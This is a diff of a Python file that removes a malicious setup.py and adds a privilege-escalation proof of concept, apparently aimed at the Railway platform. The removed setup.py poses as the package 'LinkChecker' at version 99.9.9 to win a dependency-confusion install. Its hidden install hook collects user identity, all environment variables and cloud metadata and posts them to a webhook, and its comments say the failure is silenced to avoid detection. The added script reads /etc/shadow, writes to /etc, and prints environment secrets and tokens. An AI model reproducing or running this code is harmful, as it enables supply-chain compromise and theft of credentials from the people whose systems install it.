@@ -1,36 +1,54 @@
-from setuptools import setup
-from setuptools.command.install import install
 import os
-import subprocess
-import requests
+import sys
 
-class CustomInstall(install):
-    def run(self):
-        # 1. Собираем критическую информацию
-        try:
-            payload = {
-                "whoami": subprocess.getoutput("whoami"),
-                "id": subprocess.getoutput("id"),
-                "hostname": subprocess.getoutput("hostname"),
-                "pwd": os.getcwd(),
-                # Проверяем наличие секретов в переменных окружения
-                "env_vars": dict(os.environ),
-                # Проверяем доступ к сетевым метаданным (Azure/Cloud)
-                "cloud_metadata": subprocess.getoutput("curl -m 2 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true' || echo 'no_access'")
-            }
-            
-            # 2. Отправляем данные на твой Webhook
-            webhook_url = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"
-            requests.post(webhook_url, json=payload, timeout=5)
-            
-        except Exception as e:
-            # Если что-то пошло не так, билд не должен упасть (чтобы не палиться)
-            pass
-            
-        install.run(self)
+def run_exploit():
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
+    sys.stderr.write("="*60 + "\n")
 
-setup(
-    name="LinkChecker", # Называем так же, как в оригинале
-    version="99.9.9",    # Ставим очень высокую версию
-    cmdclass={'install': CustomInstall}
-)
+    
+    uid = os.getuid()
+    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")
+
+     
+    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
+    try:
+        with open("/etc/shadow", "r") as f:
+             
+            for i, line in enumerate(f):
+                if i < 5:
+                    sys.stderr.write(line)
+                else:
+                    break
+    except Exception as e:
+        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")
+
+    
+    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
+    try:
+        target_file = "/etc/railway_pwned.txt"
+        with open(target_file, "w") as f:
+            f.write("POC by Lumos: Root write access confirmed.\n")
+        
+        if os.path.exists(target_file):
+            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
+            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
+    except Exception as e:
+        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")
+
+    
+    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
+    for key, value in os.environ.items():
+        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
+            sys.stderr.write(f"{key}={value}\n")
+
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
+    sys.stderr.write("="*60 + "\n")
+    sys.stderr.flush()
+
+    
+    sys.exit(1)
+
+if __name__ == "__main__":
+    run_exploit()
